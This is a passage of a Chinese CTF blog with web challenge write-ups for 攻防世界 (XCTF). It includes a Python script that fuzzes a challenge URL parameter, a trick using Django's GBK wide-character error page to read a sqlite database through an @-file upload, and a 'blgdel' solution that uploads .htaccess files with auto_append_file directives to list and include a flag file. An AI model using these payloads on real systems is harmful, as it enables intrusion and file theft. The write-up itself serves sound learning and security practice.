<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuzz</span>(<span class="params">location</span>):</span><br><span class="line">    url = location.split(<span class="string">&#x27;?&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    param = location.split(<span class="string">&#x27;?&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#print(param)</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;./命令执行payload.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        payload_list = file.readlines()</span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">        payload =payload.strip(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">       <span class="comment"># print(payload)</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            param:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(params)</span></span><br><span class="line">        res = requests.get(url=url,params=params)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Invalid URL&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;未被过滤的字符:<span class="subst">&#123;payload&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   fuzz(<span class="string">&#x27;http://111.200.241.244:55466/index.php?url=a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;未被过滤的字符:@</span></span><br><span class="line"><span class="string">未被过滤的字符:-</span></span><br><span class="line"><span class="string">未被过滤的字符:.</span></span><br><span class="line"><span class="string">未被过滤的字符:/&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>输入@发现在地址栏上@转换成了%40说明有编码转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:55466/index.php?url=%40</span><br></pre></td></tr></table></figure>

<p>在url处输入宽字符,比如%bf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101051385.png" alt="image-20220310105149299"></p>
<p>出现报错信息,将代码复制出来,使用浏览器打开</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101052150.png" alt="image-20220310105214023"></p>
<p>可以看到这是django的报错页面,看来是将输入的参数传到了后端的django服务中进行解析,而django设置了编码为gbk导致错误编码了宽字符(超过了ascii码的范围)</p>
<p>这里可以发现是通过post请求方式进行的而又根据之前@符号未进行过滤</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101052487.png" alt="image-20220310105233434"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101054620.png" alt="image-20220310105428400"></p>
<p>这里还需要懂一些django开发的基本知识，我感觉这道题涉及的面有点广了，django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。</p>
<p>读取settings.py文件，这里需要注意django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101054951.png" alt="image-20220310105445854"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101054712.png" alt="image-20220310105456612"></p>
<p>接着使用@访问这个文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101055492.png" alt="image-20220310105512413"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:55466/index.php?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>

<p>在响应中搜索ctf ,flag找到</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203101055850.png" alt="image-20220310105530764"></p>
<h1 id="攻防世界blgdel"><a href="#攻防世界blgdel" class="headerlink" title="攻防世界blgdel"></a>攻防世界blgdel</h1><p>目录扫描</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111430349.png" alt="image-20220311143036292"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111431368.png" alt="image-20220311143159313"></p>
<p>打开看看</p>
<p>robots.txt下面发现config.txt文件打开后得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">master</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/* /(.*)\/(.*)$/s</span></span><br><span class="line"><span class="comment">        .表示匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">        *表示匹配0个或者更多个前面的标记</span></span><br><span class="line"><span class="comment">         (.*)用来捕获分组</span></span><br><span class="line"><span class="comment">         \/表示匹配/字符</span></span><br><span class="line"><span class="comment">         .表示匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">          *表示匹配0个或者更多前面的标记</span></span><br><span class="line"><span class="comment">          (.*)表示捕获分组</span></span><br><span class="line"><span class="comment">          $表示匹配字符串的结尾</span></span><br><span class="line"><span class="comment">         s表示会匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">        综上表示匹配文末带有/的所有字符并以/作为分割进行捕获</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(.*)\/(.*)$/s&#x27;</span>,<span class="variable">$path</span>,<span class="variable">$array</span>,<span class="number">0</span>,<span class="number">9</span>))<span class="comment">#如果没有匹配到就返回1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$array</span>[<span class="number">1</span>];<span class="comment">#将array的第二个值赋值给a</span></span><br><span class="line">        <span class="title function_ invoke__">parse_str</span>(<span class="variable">$array</span>[<span class="number">2</span>],<span class="variable">$array</span>);<span class="comment">#将匹配到的第二个参数值进行变量的解析成变量与值的形式</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>]))<span class="comment">#设置了path参数</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;path=<span class="variable">$array</span>[<span class="string">&#x27;path&#x27;</span>];<span class="comment">#将path值赋值给成员变量path</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name=<span class="variable">$array</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&#x27;upload&#x27;</span>)<span class="comment">#如果a强等于upload</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable language_">$this</span>-&gt;path,<span class="variable language_">$this</span>-&gt;name);<span class="comment">#就执行upload方法</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$a</span>===<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">search</span>(<span class="variable language_">$this</span>-&gt;path,<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^uploads\/[a-z]&#123;10&#125;\/$/is&#x27;</span>,<span class="variable">$path</span>)||<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*/^uploads\/[a-z]&#123;10&#125;\/$/is</span></span><br><span class="line"><span class="comment">        ^表示匹配字符串开头</span></span><br><span class="line"><span class="comment">        uploads匹配upload字符串</span></span><br><span class="line"><span class="comment">        \/匹配/字符</span></span><br><span class="line"><span class="comment">        [a-z]中的任何字符总共匹配前面的十个</span></span><br><span class="line"><span class="comment">        \/匹配/字符</span></span><br><span class="line"><span class="comment">        $匹配字符串结尾</span></span><br><span class="line"><span class="comment">        i表示大小写不敏感</span></span><br><span class="line"><span class="comment">        s表示会匹配任何字符包括换行符</span></span><br><span class="line"><span class="comment">        综上表示匹配以uploads/十个字符/ 为开头结尾的字符串*/</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">#获取上传文件的名称</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$name</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);<span class="comment">#读取临时名字文件的值到字符串,也就是读取上传文件到字符串</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);<span class="comment">#替换&lt;</span></span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%03&#x27;</span>),<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file:|http|pre|etc/is&#x27;</span>,<span class="variable">$file</span>))<span class="comment">#匹配file:或者http或者pre或者etc</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegalbbbbbb!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="variable">$filename</span>,<span class="variable">$file</span>);<span class="comment">#将字符串输出并重命名为path+filename</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>.<span class="string">&#x27;user.jpg&#x27;</span>,<span class="variable">$file</span>);<span class="comment">#在输出并重命名为path+user.jpg</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;upload success!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params"><span class="variable">$path</span>,<span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$path</span>))<span class="comment">#如果路径不是一个目录</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;illegal!&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$files</span>=<span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);<span class="comment">#将目录下的文件全部找出来放到files数组中去</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)<span class="comment">#循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$name</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$v</span>)!==<span class="variable">$v</span>)<span class="comment">#将名字替换为空且不区分大小写如果不等于$v就输出v</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$v</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stream_stat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);<span class="comment">#取消这个协议</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;phar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_register</span>(<span class="string">&#x27;master&#x27;</span>,<span class="string">&#x27;master&#x27;</span>);<span class="comment">#注册这个协议</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>.&#x2F;htaccess文件禁止访问,这里服务器使用了.&#x2F;htaccess文件,有可能与文件上传有关</p>
<p>有注册有登录还有个文件上传页面,但是文件上传页面需要登录才能访问这里直接注册一个登录进去试试</p>
<p>上传页面有<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111438359.png" alt="image-20220311143841316"></p>
<p>限制登录,这里发现在注册时<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111452811.png" alt="image-20220311145240736"></p>
<p>有一个推荐人,第一次注册时填的自己,给了十分,这里多注册几个有分在去访问upload试试</p>
<p>这里随便上传一个一句话查找一下图片地址,发现一个目录穿越漏洞</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111935775.png" alt="image-20220311193531714"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111935511.png" alt="image-20220311193543473"></p>
<p>发现过滤了</p>
<p>接着上传.htaccess文件,并将内容改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file master://search/path=%2fhome%2f&amp;name=flag</span><br></pre></td></tr></table></figure>

<p>接着在上传php文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111942636.png" alt="image-20220311194204580"></p>
<p>然后访问这个文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111942144.png" alt="image-20220311194237097"></p>
<p>得到flag的名字hiahiahia_flag</p>
<p>在上传一个.htaccess文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file /home/hiahiahia_flag</span><br></pre></td></tr></table></figure>

<p>在上传一个php文件,接着访问这个文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203111944724.png" alt="image-20220311194446674"></p>
<p>首先进行目录扫描,搜到几个目录挨个访问得到了php源码,并发现了一个.htaccess文件,感觉像是文件上传漏洞的利用,经过简单的代码审计发现有上传点,并且有一个php协议的过滤.接着可以对本系统进行常规测试,发现没有注入,xss等常见漏洞,接着观察系统在基本功能要求之外的功能,即一个上传点(上传头像图片),和一个搜索点用于搜索以前的头像,在上传页面这里可以发现有权限问题,这里要注意前面注册时存在一个推荐人的地方,发现可以刷积分.</p>
<p>这里进入去文件上传发现会过滤php必要代码,也发现常见的伪协议都不能使用,但是新注册了一个master协议.根据上传文件得到了一个目录遍历漏洞,接着发现上传给每一个用户单独的目录.接着试着上传htaccess文件,其中可以写入php_value auto_prepend_file 1 这种语句,即通过上传漏洞,上传一个包含点上去,将上传漏洞变为上传+文件包含漏洞进行利用.而解饿和上传时pre为黑名单,可以想到此时的网站auto_prepend_file 为这个config.php,无法修改,无法替换增auto_prepend_file而使用php,zip等伪协议,所以接着考虑远程包含,和这个新注册的master协议,发现我们可以控制协议则可以给任意目录上传搜索文件,而协议流程和对象注入差不多,先是执行__construct,再是stream_open,upload&#x2F;search,stream_read…主要是upload和search,其余方法都做l处理,而上传目录被限制了,但是我们可以通过目录遍历漏洞去找文件.</p>
<p>上传.htaccess,内容为php_value auto_prepend_file master:&#x2F;&#x2F;search&#x2F;path&#x3D;{}&amp;name&#x3D;{},此时注意 &#x2F; 要替换为%2f,否则不能成功 接着在上传一个任意php文件,接着通过目录遍历漏洞访问.在payload为php_value auto_append_file master:&#x2F;&#x2F;search&#x2F;path&#x3D;%2fhome%2f&amp;name&#x3D;flag时,找到了hiahiahia_flag文件 此时在上传一个.htaccess,内容为php_value auto_append_file &#x2F;home&#x2F;haihaihai_flag就可以包含flag在访问php文件就可以看到falg</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/16cb2643.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">攻防世界(一)</div></div></a></div><div class="next-post pull-right"><a href="/f3fb008f.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">博客搭建</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/fca9eb4c.html" title="攻防世界misc"><img class="cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">攻防世界misc</div></div></a></div><div><a href="/1c49b73e.html" title="XCTF"><img class="cover" src="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">XCTF</div></div></a></div><div><a href="/16cb2643.html" title="攻防世界(一)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-18</div><div class="title">攻防世界(一)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload"><span class="toc-number">1.</span> <span class="toc-text">攻防世界upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CZhuanxv"><span class="toc-number">2.</span> <span class="toc-text">攻防世界Zhuanxv</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">文件包含下载文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E9%85%8D%E5%90%88%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%86%99wtf%E8%84%9A%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">目录穿越配合代码审计写wtf脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E5%BE%97%E5%88%B0admin%E7%9A%84cookies%E5%BE%97%E5%88%B0flag1"><span class="toc-number">3.1.</span> <span class="toc-text">目录穿越得到admin的cookies得到flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%86%99wtf%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.</span> <span class="toc-text">代码审计写wtf脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E5%88%86%E6%9E%90Weevely%E5%90%8E%E9%97%A8%E4%BB%A3%E7%A0%81-%E5%86%99%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">文件包含,目录遍历,分析Weevely后门代码,写解密函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%AF%BB%E5%8F%96Nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.</span> <span class="toc-text">本地文件包含读取Nginx配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E6%8B%BF%E5%88%B0webshel"><span class="toc-number">4.2.</span> <span class="toc-text">目录遍历漏洞拿到webshel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx%E7%9A%84alias%E7%9A%84%E7%94%A8%E6%B3%95%E5%8F%8A%E4%B8%8Eroot%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">4.2.1.</span> <span class="toc-text">Nginx的alias的用法及与root的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90Weevely-Linux%E4%B8%AD%E7%9A%84%E8%8F%9C%E5%88%80-%E5%90%8E%E9%97%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">4.3.</span> <span class="toc-text">分析Weevely(Linux中的菜刀)后门代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%90%8E%E9%97%A8%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">4.4.</span> <span class="toc-text">逆向分析后门解密过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%9E%84%E9%80%A0%E8%BF%9E%E6%8E%A5%E8%84%9A%E6%9C%AC"><span class="toc-number">4.5.</span> <span class="toc-text">构造构造连接脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#love-math%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C"><span class="toc-number">5.</span> <span class="toc-text">love_math攻防世界</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cisc-2"><span class="toc-number">6.</span> <span class="toc-text">攻防世界isc-2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cics-05-preg-replace-%E5%87%BD%E6%95%B0-x2F-e-%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">攻防世界ics-05(preg_replace()函数 &#x2F;e 漏洞)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlite-%E6%B3%A8%E5%85%A5%E5%BC%95%E5%8F%91%E7%9A%84pdf%E7%88%AC%E5%8F%96%E4%B8%8Esha1%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">8.</span> <span class="toc-text">sqlite 注入引发的pdf爬取与sha1密码爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%85%8D%E5%90%88%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">文件上传配合二次注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfakebook"><span class="toc-number">10.</span> <span class="toc-text">攻防世界fakebook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E7%AB%AFdjango%E6%9C%8D%E5%8A%A1gbk%E7%BC%96%E7%A0%81%E5%AF%BC%E8%87%B4%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">11.</span> <span 